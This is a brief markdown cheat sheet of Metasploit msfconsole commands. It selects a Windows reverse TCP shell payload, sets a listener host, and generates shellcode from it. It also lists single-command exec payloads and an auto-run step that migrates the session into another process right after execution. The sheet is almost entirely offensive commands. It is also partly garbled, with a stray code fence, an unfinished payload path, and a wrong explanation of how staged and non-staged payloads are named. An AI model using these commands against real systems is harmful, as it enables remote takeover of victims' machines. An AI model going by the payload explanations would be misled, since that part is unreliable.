## Msfconsole Have a the Keyword "generate" that Generates Shell Code. So, First Select a Payload

```bash
use payload/windows/shell_reverse_tcp
```

set LHOST 192.168.0.101
```

### Now Generate Shell Code Using the Command "generate"

```bash
generate
#to see the options use generate -h
```

## If Meterpreter Goes In and Out, Change Payload

```bash
set payload linux/x86/
```

* switch to staged or non staged

## Staged Payloads

* they will have /meterpreter/ in front of payload

## Non-Staged Payloads

* they will not have /meterpreter/

## Single Commands in Windows

### If there is Limited Space and Only a Single Command is Needed Use

```bash
use payload/windows/exec
```

```bash
use payload/cmd/windows/generic
```

## Merge Msfconsole Payload to Another Process Immediately After Execution

```bash
set AutoRunScript post/windows/manage/migrate
```
